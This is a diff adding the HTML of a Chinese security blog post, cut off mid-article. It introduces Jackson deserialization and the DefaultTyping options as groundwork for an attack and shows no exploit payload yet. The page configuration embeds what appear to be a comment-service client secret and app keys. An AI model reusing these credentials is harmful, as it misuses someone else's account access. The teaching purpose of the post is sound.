@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            Jackson 反序列化（一）漏洞原理 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/font/css/brands.min.css">
+    
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","font_size":"15px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"9Ky0YY6Ij33nFC4KZ2VcGh9k-MdYXbMMI","appkey":"qqN77H4k2Hxhg7ZJ88Lf0xxM","placeholder":"just go go","server_urls":"https://9Ky0YY6I.api.lncldglobal.com","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":"Drun1baby","github_admins":null,"repository":"gitalk-restore","client_id":"e5b5e5c0ba918eb3d3c4","client_secret":"a0ac0e6f2078095bce9291f42acd13b67e059dff","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"version":"3.7.3"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Drunkbaby's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container border-box">
+
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+
+                
+
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+
+        <div class="article-content-container border-box">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Jackson 反序列化（一）漏洞原理</span>
+            </div>
+
+            
+                <div class="article-header border-box">
+                    
+                        <div class="avatar-box border-box">
+                            <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+                        </div>
+                    
+                    <div class="info-box">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info border-box">
+                            
+
+<div class="article-meta-info-container border-box post">
+    <div class="article-meta-info border-box">
+        
+
+
+        
+            <span class="meta-info-item article-create-date">
+                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
+                <span class="pc">2023-12-07 20:05:52</span>
+                <span class="mobile">2023-12-07 20:05</span>
+            </span>
+
+            <span class="meta-info-item article-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="pc">2023-12-07 20:13:21</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                            <li class="category-item">
+                                
+                                <a href="/categories/Java/">Java</a>
+                            </li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="article-tag meta-info-item border-box">
+                <i class="icon fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java/">Java</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item article-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>5.8k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item article-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>26 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item article-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <p>迫在眉睫，用到的太多了</p>
+<h2 id="0x01-Jackson-基本使用"><a href="#0x01-Jackson-基本使用" class="headerlink" title="0x01 Jackson 基本使用"></a>0x01 Jackson 基本使用</h2><h3 id="Jackson-简介"><a href="#Jackson-简介" class="headerlink" title="Jackson 简介"></a>Jackson 简介</h3><p>Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。</p>
+<p>由于其使用简单，速度较快，且不依靠除 JDK 外的其他库，被众多用户所使用。</p>
+<h3 id="使用-Jackson-进行序列化与反序列化"><a href="#使用-Jackson-进行序列化与反序列化" class="headerlink" title="使用 Jackson 进行序列化与反序列化"></a>使用 Jackson 进行序列化与反序列化</h3><p>使用的 Jackson 包环境为 2.7.9 版本</p>
+<p><strong>pom.xml</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>自定义 Person 类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s&quot;</span>, age, name);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着编写 Jackson 的序列化与反序列化代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;Drunkbaby&quot;</span>;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;&quot;age&quot;:6,&quot;name&quot;:&quot;Drunkbaby&quot;&#125;</span></span><br><span class="line"><span class="comment">// Person.age=6, Person.name=Drunkbaby</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/JacksonTest.png" class>
+
+<h2 id="0x02-Jackson-对于多态问题的解决-——-JacksonPolymorphicDeserialization"><a href="#0x02-Jackson-对于多态问题的解决-——-JacksonPolymorphicDeserialization" class="headerlink" title="0x02 Jackson 对于多态问题的解决 —— JacksonPolymorphicDeserialization"></a>0x02 Jackson 对于多态问题的解决 —— JacksonPolymorphicDeserialization</h2><p>简单地说，Java 多态就是同一个接口使用不同的实例而执行不同的操作。</p>
+<p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？—— Jackson 实现了 JacksonPolymorphicDeserialization 机制来解决这个问题。</p>
+<p>JacksonPolymorphicDeserialization 即 Jackson 多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如 Object、接口或抽象类，则可以在 JSON 字符串中指定其具体类型，Jackson 将生成具体类型的实例。</p>
+<p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即 <code>DefaultTyping</code> 和 <code>@JsonTypeInfo</code> 注解。这里和前面学过的 fastjson 是很相似的。</p>
+<p>下面具体介绍一下。</p>
+<h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>Jackson 提供一个 enableDefaultTyping 设置，其包含 4 个值，查看 <code>jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.java</code> 可看到相关介绍信息：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">DefaultTyping</span> &#123;  </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * This value means that only properties that have  </span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including  </span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default  </span></span><br><span class="line"><span class="comment">        * typing.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       JAVA_LANG_OBJECT,  </span><br><span class="line">         </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;  </span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).  </span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       OBJECT_AND_NON_CONCRETE,  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;  </span></span><br><span class="line"><span class="comment">        * plus all array types for them.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       NON_CONCRETE_AND_ARRAYS,  </span><br><span class="line">         </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of  </span></span><br><span class="line"><span class="comment">        * &quot;natural&quot; types (String, Boolean, Integer, Double), which  </span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for  </span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       NON_FINAL  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>默认情况下，即无参数的 enableDefaultTyping 是第二个设置，OBJECT_AND_NON_CONCRETE。</strong></p>
+<p>下面分别对这几个选项进行说明。</p>
+<h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个 Object 类型时，会对该 Object 类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个 Object 本身也得是一个可被序列化的类）</p>
+<p>添加一个 Hacker 类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hacker</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">skill</span> <span class="operator">=</span> <span class="string">&quot;hiphop&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改 Person 类，添加 Object 类型属性：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>新建 <code>JAVA_LANG_OBJECTTest.java</code>，添加 <code>enableDefaultTyping()</code> 并设置为 <code>JAVA_LANG_OBJECT</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JAVA_LANG_OBJECTTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置JAVA_LANG_OBJECT  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们同样写一个类，是没有添加 <code>enableDefaultTyping()</code> 的，来对比一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoJava_LANG_OBJECT</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/compare.png" class>
+
+<p>输出对比看到，通过 enableDefaultTyping() 设置设置 JAVA_LANG_OBJECT 后，会多输出 Hacker 类名，且在输出的 Object 属性时直接输出的是 Hacker 类对象，也就是说同时对 Object 属性对象进行了序列化和反序列化操作：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.mi1k7ea.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span>  </span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=mi1k7ea<span class="punctuation">,</span> com.mi1k7ea.Hacker@<span class="number">7</span>f9a81e8  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 未设置JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span 